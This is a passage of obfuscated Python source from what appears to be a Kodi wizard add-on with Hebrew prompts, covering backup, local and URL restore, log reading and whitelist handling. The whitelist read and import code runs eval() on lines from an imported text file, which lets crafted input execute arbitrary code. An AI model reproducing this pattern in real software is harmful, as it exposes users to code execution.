        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]לבצע גיבוי הגדרות?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR white]ביטול [/COLOR][/B]",yeslabel ="[B][COLOR green]אישור[/COLOR][/B]"):#line:2294
            if name =="":#line:2295
                name =getKeyboard ("","הכנס שם באנגלית לקובץ הגיבוי")#line:2296
                if not name :return False #line:2297
                name =urllib .quote_plus (name )#line:2298
            name ='%s_addondata.zip'%name ;OOO00OO0O0OOOOOOO =''#line:2299
            O0OOO0O000O0O0OOO =os .path .join (OOOOO00000OO0OOOO ,name )#line:2300
            try :#line:2301
                OO0OOOOOO000OO0O0 =zipfile .ZipFile (translatepath (O0OOO0O000O0O0OOO ),mode ='w')#line:2302
            except :#line:2303
                try :#line:2304
                    OOO00OO0O0OOOOOOO =os .path .join (PACKAGES ,'%s.zip'%name )#line:2305
                    OO0OOOOOO000OO0O0 =zipfile .ZipFile (OOO00OO0O0OOOOOOO ,mode ='w')#line:2306
                except :#line:2307
                    log ("Unable to create %s_addondata.zip"%name ,5 )#line:2308
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]אין באפשרותנו לכתוב לספריית הגיבוי הנוכחית, האם ברצונך לשנות את המיקום?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]"):#line:2309
                        openS ()#line:2310
                        return #line:2311
                    else :#line:2312
                        return #line:2313
            OOOOO0O00OO000OOO =0 #line:2314
            OOO00OO0OOO0O00OO =[]#line:2315
            convertSpecial (ADDOND ,True )#line:2316
            asciiCheck (ADDOND ,True )#line:2317
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2318
            for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (ADDOND ):#line:2319
                O0OOOO0000OOO0O0O [:]=[O0O0O0000O0OOOO0O for O0O0O0000O0OOOO0O in O0OOOO0000OOO0O0O if O0O0O0000O0OOOO0O not in O0OO00000O000O00O ]#line:2320
                OOO0OO0O00O0OOO00 [:]=[OOO0OO0O000O0OOO0 for OOO0OO0O000O0OOO0 in OOO0OO0O00O0OOO00 if OOO0OO0O000O0OOO0 not in OO00000000OOO0OOO ]#line:2321
                for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2322
                    OOO00OO0OOO0O00OO .append (OO0O00000O0OOOO00 )#line:2323
            O0O0OOO00O000OO0O =len (OOO00OO0OOO0O00OO )#line:2324
            for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (ADDOND ):#line:2325
                O0OOOO0000OOO0O0O [:]=[O0OOO0O0000000000 for O0OOO0O0000000000 in O0OOOO0000OOO0O0O if O0OOO0O0000000000 not in O0OO00000O000O00O ]#line:2326
                OOO0OO0O00O0OOO00 [:]=[OO00O000O00000O0O for OO00O000O00000O0O in OOO0OO0O00O0OOO00 if OO00O000O00000O0O not in OO00000000OOO0OOO ]#line:2327
                for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2328
                    try :#line:2329
                        OOOOO0O00OO000OOO +=1 #line:2330
                        OOOOOOO000O00OOO0 =percentage (OOOOO0O00OO000OOO ,O0O0OOO00O000OO0O )#line:2331
                        DP .update (int (OOOOOOO000O00OOO0 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O00OO000OOO ,COLOR1 ,O0O0OOO00O000OO0O ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O00000O0OOOO00 ),'')#line:2332
                        OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2333
                        if OO0O00000O0OOOO00 in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2334
                        elif os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )in O00000000OOO000O0 :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2335
                        elif os .path .join ('addons','packages')in OOOOOO00OOO0000OO :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2336
                        elif OO0O00000O0OOOO00 .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2337
                        elif OO0O00000O0OOOO00 .endswith ('.db')and 'Database'in O0OO0OO0OO0O0O0OO :#line:2338
                            O0OOO0O0OO0OOOOOO =OO0O00000O0OOOO00 .replace ('.db','')#line:2339
                            O0OOO0O0OO0OOOOOO =''.join ([O00O0OOOOO0OO0OOO for O00O0OOOOO0OO0OOO in O0OOO0O0OO0OOOOOO if not O00O0OOOOO0OO0OOO .isdigit ()])#line:2340
                            if O0OOO0O0OO0OOOOOO in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2341
                                if not OO0O00000O0OOOO00 ==latestDB (O0OOO0O0OO0OOOOOO ):log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2342
                        try :#line:2343
                            OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (ADDOND ):],zipfile .ZIP_DEFLATED )#line:2344
                        except Exception as OO000O00OO0OOO000 :#line:2345
                            log ("[Back Up] Type = '%s': Unable to backup %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 )#line:2346
                            log ("Backup Error: %s"%str (OO000O00OO0OOO000 ),5 )#line:2347
                    except Exception as OO000O00OO0OOO000 :#line:2348
                        log ("[Back Up] Type = '%s': Unable to backup %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 )#line:2349
                        log ("Backup Error: %s"%str (OO000O00OO0OOO000 ),5 )#line:2350
            OO0OOOOOO000OO0O0 .close ()#line:2351
            if not OOO00OO0O0OOOOOOO =='':#line:2352
                OO00000O00OO0000O =xbmcvfs .rename (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2353
                if OO00000O00OO0000O ==0 :#line:2354
                    xbmcvfs .copy (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2355
                    xbmcvfs .delete (OOO00OO0O0OOOOOOO )#line:2356
            DP .close ()#line:2357
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]הגיבוי בוצע בהצלחה![/COLOR]"%(COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O000O0O0OOO ))#line:2358
def restoreLocal (O0OOO00O0O0O0OOOO ):#line:2360
    OOOOO0OO00000000O =translatepath (BACKUPLOCATION )#line:2361
    O000OOOO00000O0O0 =translatepath (MYBUILDS )#line:2362
    try :#line:2363
        if not os .path .exists (OOOOO0OO00000000O ):xbmcvfs .mkdirs (OOOOO0OO00000000O )#line:2364
        if not os .path .exists (O000OOOO00000O0O0 ):xbmcvfs .mkdirs (O000OOOO00000O0O0 )#line:2365
    except Exception as O0OOO00OO00000OO0 :#line:2366
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (O0OOO00OO00000OO0 )))#line:2367
        return #line:2368
    O0OO0OO00O00OO0O0 =DIALOG .browse (1 ,'[COLOR %s]בחר את הקובץ שתרצה לשחזר[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2369
    log ("[RESTORE BACKUP %s] File: %s "%(O0OOO00O0O0O0OOOO .upper (),O0OO0OO00O00OO0O0 ),5 )#line:2370
    if O0OO0OO00O00OO0O0 ==""or not O0OO0OO00O00OO0O0 .endswith ('.zip'):#line:2371
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore: Cancelled[/COLOR]"%COLOR2 )#line:2372
        return #line:2373
    DP .create (ADDONTITLE ,'[COLOR %s]Installing Local Backup'%COLOR2 ,'','Please Wait[/COLOR]')#line:2374
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2375
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2376
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2377
    if O0OOO00O0O0O0OOOO =="gui":O00O00OO00OO00OO0 =USERDATA #line:2378
    elif O0OOO00O0O0O0OOOO =="addondata":#line:2379
        O00O00OO00OO00OO0 =ADDOND #line:2380
    else :O00O00OO00OO00OO0 =HOME #line:2381
    log ("Restoring to %s"%O00O00OO00OO00OO0 ,5 )#line:2382
    O00OO00O0O000OO0O =os .path .split (O0OO0OO00O00OO0O0 )#line:2383
    OOO000000O0OO00O0 =O00OO00O0O000OO0O [1 ]#line:2384
    try :#line:2385
        zipfile .ZipFile (O0OO0OO00O00OO0O0 ,'r')#line:2386
    except :#line:2387
        DP .update (0 ,'[COLOR %s]Unable to read zipfile from current location.'%COLOR2 ,'Copying file to packages')#line:2388
        O0000O0000000OOO0 =os .path .join ('special://home','addons','packages',OOO000000O0OO00O0 )#line:2389
        xbmcvfs .copy (O0OO0OO00O00OO0O0 ,O0000O0000000OOO0 )#line:2390
        O0OO0OO00O00OO0O0 =translatepath (O0000O0000000OOO0 )#line:2391
        DP .update (0 ,'','Copying file to packages: Complete')#line:2392
        zipfile .ZipFile (O0OO0OO00O00OO0O0 ,'r')#line:2393
    O0O0O00O00OO0OO0O ,O000O00O0000000O0 ,O00O0O0O000000OO0 =extract .all (O0OO0OO00O00OO0O0 ,O00O00OO00OO00OO0 ,DP )#line:2394
    clearS ('build')#line:2395
    DP .close ()#line:2396
    defaultSkin ()#line:2397
    lookandFeelData ('save')#line:2398
    if not O0OO0OO00O00OO0O0 .find ('packages')==-1 :#line:2399
        try :os .remove (O0OO0OO00O00OO0O0 )#line:2400
        except :pass #line:2401
    if int (O000O00O0000000O0 )>=1 :#line:2402
        OOOO0OO0OO0O0O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000000O0OO00O0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O00O00OO0OO0O ,'%',COLOR1 ,O000O00O0000000O0 ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2403
        if OOOO0OO0OO0O0O00O :#line:2404
            if isinstance (O000O00O0000000O0 ,unicode ):#line:2405
                O00O0O0O000000OO0 =O00O0O0O000000OO0 .encode ('utf-8')#line:2406
            TextBox (ADDONTITLE ,O00O0O0O000000OO0 .replace ('\t',''))#line:2407
    setS ('installed','true')#line:2408
    setS ('extract',str (O0O0O00O00OO0OO0O ))#line:2409
    setS ('errors',str (O000O00O0000000O0 ))#line:2410
    if INSTALLMETHOD ==1 :O00O0OOOOO000OO0O =1 #line:2411
    elif INSTALLMETHOD ==2 :O00O0OOOOO000OO0O =0 #line:2412
    else :DIALOG .ok (ADDONTITLE ,"[COLOR %s]השחזור בוצע בהצלחה![/COLOR]"%COLOR2 );killxbmc ('true')#line:2413
    if O00O0OOOOO000OO0O ==1 :reloadFix ()#line:2414
    else :killxbmc (True )#line:2415
def restoreExternal (O0000O0O000O000O0 ):#line:2417
    O000O00O0OOOOO0OO =DIALOG .browse (1 ,'[COLOR %s]Select the backup file you want to restore[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2418
    if O000O00O0OOOOO0OO ==""or not O000O00O0OOOOO0OO .endswith ('.zip'):#line:2419
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Cancelled[/COLOR]"%COLOR2 )#line:2420
        return #line:2421
    if not O000O00O0OOOOO0OO .startswith ('http'):#line:2422
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Invalid URL[/COLOR]"%COLOR2 )#line:2423
        return #line:2424
    try :#line:2425
        OO0OO0O00O0O000OO =workingURL (O000O00O0OOOOO0OO )#line:2426
    except :#line:2427
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Error Valid URL[/COLOR]"%COLOR2 )#line:2428
        log ("Not a working url, if source was local then use local restore option",5 )#line:2429
        log ("External Source: %s"%O000O00O0OOOOO0OO ,5 )#line:2430
        return #line:2431
    log ("[RESTORE EXT BACKUP %s] File: %s "%(O0000O0O000O000O0 .upper (),O000O00O0OOOOO0OO ),5 )#line:2432
    OOO000OOOO0O000OO =os .path .split (O000O00O0OOOOO0OO );O0O0000O00000O0OO =OOO000OOOO0O000OO [1 ]#line:2433
    DP .create (ADDONTITLE ,'[COLOR %s]Downloading Zip file'%COLOR2 ,'','Please Wait[/COLOR]')#line:2434
    if O0000O0O000O000O0 =="gui":OO0O00OOOO0O00000 =USERDATA #line:2435
    elif O0000O0O000O000O0 =="addondata":OO0O00OOOO0O00000 =ADDOND #line:2436
    else :OO0O00OOOO0O00000 =HOME #line:2437
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2438
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2439
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2440
    O00OO00OO0O00O000 =os .path .join (PACKAGES ,O0O0000O00000O0OO )#line:2441
    downloader .download (O000O00O0OOOOO0OO ,O00OO00OO0O00O000 ,DP )#line:2442
    DP .update (0 ,'Installing External Backup','','Please Wait')#line:2443
    O0O0O0O0O0O0OOOOO ,O0O0OO00OOOOOO0OO ,OOO00OO0OOOOOOOOO =extract .all (O00OO00OO0O00O000 ,OO0O00OOOO0O00000 ,DP )#line:2444
    clearS ('build')#line:2445
    DP .close ()#line:2446
    defaultSkin ()#line:2447
    lookandFeelData ('save')#line:2448
    if int (O0O0OO00OOOOOO0OO )>=1 :#line:2449
        O000O0OOO0OO0O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O00000O0OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O0O0O0O0OOOOO ,'%',COLOR1 ,O0O0OO00OOOOOO0OO ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2450
        if O000O0OOO0OO0O00O :#line:2451
            TextBox (ADDONTITLE ,OOO00OO0OOOOOOOOO .replace ('\t',''))#line:2452
    setS ('installed','true')#line:2453
    setS ('extract',str (O0O0O0O0O0O0OOOOO ))#line:2454
    setS ('errors',str (O0O0OO00OOOOOO0OO ))#line:2455
    try :os .remove (O00OO00OO0O00O000 )#line:2456
    except :pass #line:2457
    if INSTALLMETHOD ==1 :OOOO00OOO00OOO00O =1 #line:2458
    elif INSTALLMETHOD ==2 :OOOO00OOO00OOO00O =0 #line:2459
    else :OOOO00OOO00OOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR green]Force Close[/COLOR][/B]")#line:2460
    if OOOO00OOO00OOO00O ==1 :reloadFix ()#line:2461
    else :killxbmc (True )#line:2462
def Grab_Log (file =False ,old =False ,wizard =False ):#line:2478
    if wizard ==True :#line:2479
        if not os .path .exists (WIZLOG ):return False #line:2480
        else :#line:2481
            if file ==True :#line:2482
                return WIZLOG #line:2483
            else :#line:2484
                O0O00OOO0O00O00O0 =open (WIZLOG ,'r')#line:2485
                OO000OO0OO0000OO0 =O0O00OOO0O00O00O0 .read ()#line:2486
                O0O00OOO0O00O00O0 .close ()#line:2487
                return OO000OO0OO0000OO0 #line:2488
    O00O0O0O0OO00OO00 =0 #line:2489
    O0OOOOOO00000O00O =os .listdir (LOG )#line:2490
    OOO0O00OOO000O000 =[]#line:2491
    for O00O00OOO00O00OO0 in O0OOOOOO00000O00O :#line:2493
        if old ==True and O00O00OOO00O00OO0 .endswith ('.old.log'):OOO0O00OOO000O000 .append (os .path .join (LOG ,O00O00OOO00O00OO0 ))#line:2494
        elif old ==False and O00O00OOO00O00OO0 .endswith ('.log')and not O00O00OOO00O00OO0 .endswith ('.old.log'):OOO0O00OOO000O000 .append (os .path .join (LOG ,O00O00OOO00O00OO0 ))#line:2495
    if len (OOO0O00OOO000O000 )>0 :#line:2497
        OOO0O00OOO000O000 .sort (key =lambda OO00OO0OO0O00OO00 :os .path .getmtime (OO00OO0OO0O00OO00 ))#line:2498
        if file ==True :return OOO0O00OOO000O000 [-1 ]#line:2499
        else :#line:2500
            O0O00OOO0O00O00O0 =open (OOO0O00OOO000O000 [-1 ],'r')#line:2501
            OO000OO0OO0000OO0 =O0O00OOO0O00O00O0 .read ()#line:2502
            O0O00OOO0O00O00O0 .close ()#line:2503
            return OO000OO0OO0000OO0 #line:2504
    else :#line:2505
        return False #line:2506
def whiteList (OOO00OOOOOOO00OOO ):#line:2508
    OO0OOO0O0O0OO00O0 =translatepath (BACKUPLOCATION )#line:2509
    OOO00OO00OO00000O =translatepath (MYBUILDS )#line:2510
    if OOO00OOOOOOO00OOO =='edit':#line:2511
        O0000O00O00O0000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2512
        OO0O00OOOO0O0O0O0 =[];O00O0O000OO0O0OOO =[];OOO00OO0O000000O0 =[]#line:2513
        for O0O0O000O0OOO000O in sorted (O0000O00O00O0000O ,key =lambda O0O000O0O0000O0OO :O0O000O0O0000O0OO ):#line:2514
            OO000O000000OO000 =os .path .split (O0O0O000O0OOO000O [:-1 ])[1 ]#line:2515
            if OO000O000000OO000 in EXCLUDES :continue #line:2516
            elif OO000O000000OO000 in DEFAULTPLUGINS :continue #line:2517
            elif OO000O000000OO000 =='packages':continue #line:2518
            OOOOOO0OO0OO0O0OO =os .path .join (O0O0O000O0OOO000O ,'addon.xml')#line:2519
            if os .path .exists (OOOOOO0OO0OO0O0OO ):#line:2520
                OO0OO0OOOO0O0OO0O =open (OOOOOO0OO0OO0O0OO )#line:2521
                OOO00OO0O000000OO =OO0OO0OOOO0O0OO0O .read ()#line:2522
                OO0OO0OOOO0O0OO0O .close ()#line:2523
                O0O000O0O000O0O0O =parseDOM (OOO00OO0O000000OO ,'addon',ret ='id')#line:2524
                OOO0OOOO0O00O0000 =parseDOM (OOO00OO0O000000OO ,'addon',ret ='name')#line:2525
                O00O00OO0OOOOOOOO =OO000O000000OO000 if len (O0O000O0O000O0O0O )==0 else O0O000O0O000O0O0O [0 ]#line:2526
                O000O0000O000O0OO =OO000O000000OO000 if len (OOO0OOOO0O00O0000 )==0 else OOO0OOOO0O00O0000 [0 ]#line:2527
                O000O000OO000O0O0 =O000O0000O000O0OO .replace ('[','<').replace (']','>')#line:2528
                O000O000OO000O0O0 =re .sub ('<[^<]+?>','',O000O000OO000O0O0 )#line:2529
                OO0O00OOOO0O0O0O0 .append (O000O000OO000O0O0 )#line:2530
                O00O0O000OO0O0OOO .append (O00O00OO0OOOOOOOO )#line:2531
                OOO00OO0O000000O0 .append (OO000O000000OO000 )#line:2532
        O00OO00O000O000OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:2533
        for O0O0O000O0OOO000O in sorted (O00OO00O000O000OO ,key =lambda OOO00O0O0OO0O0O0O :OOO00O0O0OO0O0O0O ):#line:2534
            OO000O000000OO000 =os .path .split (O0O0O000O0OOO000O [:-1 ])[1 ]#line:2535
            if OO000O000000OO000 in OOO00OO0O000000O0 :continue #line:2536
            if OO000O000000OO000 in EXCLUDES :continue #line:2537
            OOOOOO0OO0OO0O0OO =os .path .join (ADDONS ,OO000O000000OO000 ,'addon.xml')#line:2538
            OO00OO0O0OOO0O000 =os .path .join (XBMC ,'addons',OO000O000000OO000 ,'addon.xml')#line:2539
            if os .path .exists (OOOOOO0OO0OO0O0OO ):#line:2540
                OO0OO0OOOO0O0OO0O =open (OOOOOO0OO0OO0O0OO )#line:2541
            elif os .path .exists (OO00OO0O0OOO0O000 ):#line:2542
                OO0OO0OOOO0O0OO0O =open (OO00OO0O0OOO0O000 )#line:2543
            else :continue #line:2544
            OOO00OO0O000000OO =OO0OO0OOOO0O0OO0O .read ()#line:2545
            OO0OO0OOOO0O0OO0O .close ()#line:2546
            O0O000O0O000O0O0O =parseDOM (OOO00OO0O000000OO ,'addon',ret ='id')#line:2547
            OOO0OOOO0O00O0000 =parseDOM (OOO00OO0O000000OO ,'addon',ret ='name')#line:2548
            O00O00OO0OOOOOOOO =OO000O000000OO000 if len (O0O000O0O000O0O0O )==0 else O0O000O0O000O0O0O [0 ]#line:2549
            O000O0000O000O0OO =OO000O000000OO000 if len (OOO0OOOO0O00O0000 )==0 else OOO0OOOO0O00O0000 [0 ]#line:2550
            O000O000OO000O0O0 =O000O0000O000O0OO .replace ('[','<').replace (']','>')#line:2551
            O000O000OO000O0O0 =re .sub ('<[^<]+?>','',O000O000OO000O0O0 )#line:2552
            OO0O00OOOO0O0O0O0 .append (O000O000OO000O0O0 )#line:2553
            O00O0O000OO0O0OOO .append (O00O00OO0OOOOOOOO )#line:2554
            OOO00OO0O000000O0 .append (OO000O000000OO000 )#line:2555
        O00OO0OO0O00OO0O0 =[];OOOOO00O0O000000O =0 #line:2556
        O0OO00O0O000000O0 =["-- לחץ כאן להמשך --"]+OO0O00OOOO0O0O0O0 #line:2557
        O00OO0OOO00000OOO =whiteList ('read')#line:2558
        for O00O0O0OO0OOO0OOO in O00OO0OOO00000OOO :#line:2559
            log (str (O00O0O0OO0OOO0OOO ),5 )#line:2560
            try :OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0000O00O00O0000O =O00O0O0OO0OOO0OOO #line:2561
            except Exception as O0OOOOO0O0OO0OO00 :log (str (O0OOOOO0O0OO0OO00 ))#line:2562
            if OO000000O00OO0OO0 in O00O0O000OO0O0OOO :#line:2563
                OOO00OOOOOO0OOOO0 =O00O0O000OO0O0OOO .index (OO000000O00OO0OO0 )+1 #line:2564
                O00OO0OO0O00OO0O0 .append (OOO00OOOOOO0OOOO0 -1 )#line:2565
                O0OO00O0O000000O0 [OOO00OOOOOO0OOOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0000OOOOOO00000 )#line:2566
            else :#line:2567
                O00O0O000OO0O0OOO .append (OO000000O00OO0OO0 )#line:2568
                OO0O00OOOO0O0O0O0 .append (OO0000OOOOOO00000 )#line:2569
                O0OO00O0O000000O0 .append ("[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0000OOOOOO00000 ))#line:2570
        OOOOO00O0O000000O =1 #line:2571
        while not OOOOO00O0O000000O in [-1 ,0 ]:#line:2572
            OOOOO00O0O000000O =DIALOG .select ("%s: בחר הרחבות לשמירה ."%ADDONTITLE ,O0OO00O0O000000O0 )#line:2573
            if OOOOO00O0O000000O ==-1 :break #line:2574
            elif OOOOO00O0O000000O ==0 :break #line:2575
            else :#line:2576
                O00O0O00OOO00000O =(OOOOO00O0O000000O -1 )#line:2577
                if O00O0O00OOO00000O in O00OO0OO0O00OO0O0 :#line:2578
                    O00OO0OO0O00OO0O0 .remove (O00O0O00OOO00000O )#line:2579
                    O0OO00O0O000000O0 [OOOOO00O0O000000O ]=OO0O00OOOO0O0O0O0 [O00O0O00OOO00000O ]#line:2580
                else :#line:2581
                    O00OO0OO0O00OO0O0 .append (O00O0O00OOO00000O )#line:2582
                    O0OO00O0O000000O0 [OOOOO00O0O000000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O00OOOO0O0O0O0 [O00O0O00OOO00000O ])#line:2583
        OOOO00OO0000OOOOO =[]#line:2584
        if len (O00OO0OO0O00OO0O0 )>0 :#line:2585
            for OO00O0000O00000O0 in O00OO0OO0O00OO0O0 :#line:2586
                OOOO00OO0000OOOOO .append ("['%s', '%s', '%s']"%(OO0O00OOOO0O0O0O0 [OO00O0000O00000O0 ],O00O0O000OO0O0OOO [OO00O0000O00000O0 ],OOO00OO0O000000O0 [OO00O0000O00000O0 ]))#line:2587
            O00O0OOO000OO0OOO ='\n'.join (OOOO00OO0000OOOOO )#line:2588
            OO0OO0OOOO0O0OO0O =open (WHITELIST ,'w');OO0OO0OOOO0O0OO0O .write (O00O0OOO000OO0OOO );OO0OO0OOOO0O0OO0O .close ()#line:2589
        else :#line:2590
            try :os .remove (WHITELIST )#line:2591
            except :pass #line:2592
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Addons in White List[/COLOR]"%(COLOR2 ,len (O00OO0OO0O00OO0O0 )))#line:2593
    elif OOO00OOOOOOO00OOO =='read':#line:2594
        OOO0000O0O00O0O0O =[]#line:2595
        if os .path .exists (WHITELIST ):#line:2596
            OO0OO0OOOO0O0OO0O =open (WHITELIST )#line:2597
            OOO00OO0O000000OO =OO0OO0OOOO0O0OO0O .read ()#line:2598
            OO0OO0OOOO0O0OO0O .close ()#line:2599
            OOOOO00O0O000OO0O =OOO00OO0O000000OO .split ('\n')#line:2600
            for O00O0O0OO0OOO0OOO in OOOOO00O0O000OO0O :#line:2601
                try :#line:2602
                    OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0000O00O00O0000O =eval (O00O0O0OO0OOO0OOO )#line:2603
                    OOO0000O0O00O0O0O .append (eval (O00O0O0OO0OOO0OOO ))#line:2604
                except :#line:2605
                    pass #line:2606
        return OOO0000O0O00O0O0O #line:2607
    elif OOO00OOOOOOO00OOO =='view':#line:2608
        OOO00OO0O00O00OOO =whiteList ('read')#line:2609
        if len (OOO00OO0O00O00OOO )>0 :#line:2610
            O0O0OO0OO00O000O0 ="רשימת הרחבות שסימנתם שלא ימחקו בהתקנה נקיה או רגילה.[CR][CR]"#line:2611
            for O00O0O0OO0OOO0OOO in OOO00OO0O00O00OOO :#line:2612
                try :OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0000O00O00O0000O =O00O0O0OO0OOO0OOO #line:2613
                except Exception as O0OOOOO0O0OO0OO00 :log (str (O0OOOOO0O0OO0OO00 ))#line:2614
                O0O0OO0OO00O000O0 +="[COLOR %s]%s[/COLOR] [COLOR %s]\"%s\"[/COLOR][CR]"%(COLOR1 ,OO0000OOOOOO00000 ,COLOR2 ,OO000000O00OO0OO0 )#line:2615
            TextBox ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),O0O0OO0OO00O000O0 )#line:2616
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No items in White List[/COLOR]"%COLOR2 )#line:2617
    elif OOO00OOOOOOO00OOO =='import':#line:2618
        O0O000O00OOOO0O0O =DIALOG .browse (1 ,'[COLOR %s]Select the whitelist file to import[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:2619
        log (str (O0O000O00OOOO0O0O ))#line:2620
        if not O0O000O00OOOO0O0O .endswith ('.txt'):#line:2621
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Cancelled![/COLOR]"%COLOR2 )#line:2622
            return #line:2623
        OO0OO0OOOO0O0OO0O =xbmcvfs .File (O0O000O00OOOO0O0O )#line:2624
        OOO00OO0O000000OO =OO0OO0OOOO0O0OO0O .read ()#line:2625
        OO0OO0OOOO0O0OO0O .close ()#line:2626
        OO00O0O0000O0OOO0 =whiteList ('read');O0000O000O00O0O00 =[];OOO0O0OOOO0O0O0O0 =0 #line:2627
        for O00O0O0OO0OOO0OOO in OO00O0O0000O0OOO0 :#line:2628
            OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0000O00O00O0000O =O00O0O0OO0OOO0OOO #line:2629
            O0000O000O00O0O00 .append (OO000000O00OO0OO0 )#line:2630
        OOOOO00O0O000OO0O =OOO00OO0O000000OO .split ('\n')#line:2631
        with open (WHITELIST ,'a')as OO0OO0OOOO0O0OO0O :#line:2632
            for O00O0O0OO0OOO0OOO in OOOOO00O0O000OO0O :#line:2633
                try :#line:2634
                    OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0O0O000O0OOO000O =eval (O00O0O0OO0OOO0OOO )#line:2635
                except Exception as O0OOOOO0O0OO0OO00 :#line:2636
                    log ("Error Adding: '%s' / %s"%(O00O0O0OO0OOO0OOO ,str (O0OOOOO0O0OO0OO00 )),5 )#line:2637
                    continue #line:2638
                log ("%s / %s / %s"%(OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0O0O000O0OOO000O ),5 )#line:2639
                if not OO000000O00OO0OO0 in O0000O000O00O0O00 :#line:2640
                    OOO0O0OOOO0O0O0O0 +=1 #line:2641
